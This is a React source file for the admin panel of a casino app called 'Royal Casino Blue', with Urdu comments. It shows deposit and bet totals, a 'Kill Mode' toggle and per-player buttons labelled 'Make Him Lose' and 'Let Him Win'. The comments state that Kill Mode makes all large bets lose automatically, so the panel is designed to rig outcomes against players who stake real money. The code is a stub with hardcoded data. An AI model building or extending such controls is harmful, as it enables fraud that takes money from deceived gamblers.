// Royal Casino Blue - Master Admin Control Panel
import React, { useState } from 'react';

const AdminPanel = () => {
  // ایڈمن کے لیے اہم ڈیٹا (یہ ڈیٹا بیس سے لنک ہوگا)
  const [stats, setStats] = useState({
    totalUsers: 145,
    totalDeposits: 15200,
    activeBets: 4500,
    killMode: true // یہاں سے آپ سسٹم کو "ہارنے" پر سیٹ کریں گے
  });

  return (
    <div style={styles.adminContainer}>
      <h1 style={styles.title}>Master Control Center</h1>
      
      {/* ایپ کی مجموعی رپورٹ */}
      <div style={styles.statsGrid}>
        <div style={styles.statCard}>Users: {stats.totalUsers}</div>
        <div style={styles.statCard}>Deposits: ₨ {stats.totalDeposits}</div>
        <div style={styles.statCard}>Active Bets: ₨ {stats.activeBets}</div>
      </div>

      {/* کنٹرول بٹنز */}
      <div style={styles.controlSection}>
        <h3>Quick Controls</h3>
        <button 
          style={{...styles.btn, backgroundColor: stats.killMode ? 'red' : 'green'}}
          onClick={() => setStats({...stats, killMode: !stats.killMode})}
        >
          {stats.killMode ? "KILL MODE: ON" : "KILL MODE: OFF"}
        </button>
        <p style={styles.infoText}>جب Kill Mode آن ہوگا، تمام بڑی بیٹس (Bets) خودکار طریقے سے ہار جائیں گی۔</p>
      </div>

      {/* یوزر مینجمنٹ لسٹ */}
      <div style={styles.userList}>
        <h3>Recent Players</h3>
        <div style={styles.userRow}>
          <span>Ahmad_96</span>
          <span>Bet: ₨ 1000</span>
          <button style={styles.smallBtn}>Make Him Lose</button>
        </div>
        <div style={styles.userRow}>
          <span>User_442</span>
          <span>Bet: ₨ 200</span>
          <button style={{...styles.smallBtn, backgroundColor: 'blue'}}>Let Him Win</button>
        </div>
      </div>
    </div>
  );
};

const styles = {
  adminContainer: { backgroundColor: '#121212', color: '#fff', padding: '20px', height: '100vh', fontFamily: 'sans-serif' },
  title: { color: '#ffc300', borderBottom: '2px solid #ffc300', paddingBottom: '10px' },
  statsGrid: { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', marginTop: '20px' },
  statCard: { backgroundColor: '#1e1e1e', padding: '15px', borderRadius: '10px', textAlign: 'center', border: '1px solid #333' },
  controlSection: { marginTop: '30px', padding: '15px', backgroundColor: '#1e1e1e', borderRadius: '10px' },
  btn: { width: '100%', padding: '15px', border: 'none', borderRadius: '5px', color: '#fff', fontWeight: 'bold', cursor: 'pointer' },
  infoText: { fontSize: '12px', color: '#888', marginTop: '5px' },
  userList: { marginTop: '30px' },
  userRow: { display: 'flex', justifyContent: 'space-between', backgroundColor: '#222', padding: '10px', marginBottom: '5px', borderRadius: '5px', alignItems: 'center' },
  smallBtn: { backgroundColor: 'red', color: '#white', border: 'none', padding: '5px 10px', borderRadius: '3px', fontSize: '12px' }
};

export default AdminPanel;
